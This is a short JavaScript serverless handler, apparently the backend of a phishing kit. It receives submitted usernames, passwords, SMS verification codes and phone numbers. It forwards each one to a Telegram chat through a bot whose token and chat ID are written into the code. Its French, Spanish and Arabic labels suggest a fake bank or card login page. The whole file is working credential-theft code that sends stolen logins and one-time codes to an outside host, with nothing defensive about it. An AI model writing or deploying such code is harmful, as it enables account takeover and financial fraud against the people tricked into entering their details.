export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { 

    username,
    password,
    mss,
    sms_input,
    phoneNumber,

  } = req.body;

  const BOT_TOKEN = "8329902509:AAHvnHeuPk847NLWrkxpuzeeOUxPpR4aHdI";
  const CHAT_ID = "-4880874919";

  let message = "";

if (username && password ) {
    // 🟢 رسالة الكارت
    message = `
    🔑 Nouveau PIN Login:
    - Identifiant: ${username}
    - Mot de passe: ${password}
     `;
} else if (mss ) {
  // 🟢 رسالة الكارت
  message = `
  🔑 mss recibido Login:
  - mss: ${mss}
   `;
}else if (sms_input ) {
  // 🟢 رسالة الكارت
  message = `
  🔑sms Login:
  - sms: ${sms_input}
   `;
}else if (phoneNumber ) {
  // 🟢 رسالة الكارت
  message = `
  🔑phoneNumber de teléfono:
  - phoneNumber de telefone: ${phoneNumber}
   `;
}
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "✅ Envoyé avec succès" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
  }
}